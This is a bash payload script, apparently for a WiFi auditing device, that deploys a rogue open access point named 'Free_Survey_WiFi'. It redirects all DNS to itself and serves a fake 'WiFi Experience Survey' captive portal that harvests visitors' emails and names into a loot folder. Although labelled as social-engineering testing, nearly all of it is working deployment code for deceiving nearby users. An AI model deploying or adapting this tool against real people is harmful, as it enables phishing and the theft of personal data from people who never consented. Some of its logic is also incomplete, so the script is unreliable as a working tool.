#!/bin/bash
# Title: NullSec Survey Portal
# Author: bad-antics
# Description: Deploy a convincing WiFi survey portal to collect user data for SE assessments
# Category: nullsec

LOOT_DIR="/mmc/nullsec/loot/survey"
mkdir -p "$LOOT_DIR"

PROMPT "SURVEY PORTAL
━━━━━━━━━━━━━━━━━━━━━━━━━
Deploy WiFi satisfaction
survey captive portal.

Collects emails and
feedback for SE testing.

Press OK to configure."

SSID=$(EDIT_STRING "Portal SSID:" "Free_Survey_WiFi")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="Free_Survey_WiFi" ;; esac

PORTAL_TITLE=$(EDIT_STRING "Survey title:" "WiFi Experience Survey")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PORTAL_TITLE="WiFi Experience Survey" ;; esac

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "SURVEY CONFIG:
SSID: $SSID
Title: $PORTAL_TITLE
Duration: ${DURATION}min

DEPLOY?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

PORTAL_DIR="/tmp/survey_portal"
mkdir -p "$PORTAL_DIR"

cat > "$PORTAL_DIR/index.html" << HTMLEOF
<!DOCTYPE html>
<html>
<head><title>$PORTAL_TITLE</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial;margin:0;padding:20px;background:#f5f5f5}
.container{max-width:400px;margin:0 auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
h2{color:#333;text-align:center}
input,select,textarea{width:100%;padding:10px;margin:5px 0 15px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#4CAF50;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}
</style></head>
<body>
<div class="container">
<h2>$PORTAL_TITLE</h2>
<p>Complete this quick survey to access free WiFi.</p>
<form method="POST" action="/submit">
<input name="email" type="email" placeholder="Email address" required>
<input name="name" placeholder="Full name">
<select name="rating"><option>Excellent</option><option>Good</option><option>Fair</option><option>Poor</option></select>
<textarea name="feedback" placeholder="Comments..." rows="3"></textarea>
<button type="submit">Submit & Connect</button>
</form></div></body></html>
HTMLEOF

SPINNER_START "Portal active..."

# Start AP
hostapd -B /tmp/survey_hostapd.conf 2>/dev/null
dnsmasq --no-daemon --interface=wlan1 --dhcp-range=10.0.0.10,10.0.0.100,12h     --address=/#/10.0.0.1 --no-resolv 2>/dev/null &
DNSMASQ_PID=$!

# Simple HTTP server to collect submissions
while IFS= read -r line; do
    if echo "$line" | grep -q "POST"; then
        echo "$line" >> "$LOOT_DIR/submissions_$(date +%Y%m%d).txt"
    fi
done < <(timeout $((DURATION * 60)) nc -lk -p 80 < "$PORTAL_DIR/index.html" 2>/dev/null)

kill $DNSMASQ_PID 2>/dev/null
killall hostapd 2>/dev/null
SPINNER_STOP

SUBMISSIONS=$(wc -l < "$LOOT_DIR/submissions_$(date +%Y%m%d).txt" 2>/dev/null || echo "0")
PROMPT "SURVEY COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━━
Submissions: $SUBMISSIONS
Duration: ${DURATION}min
SSID: $SSID

Results saved to loot."
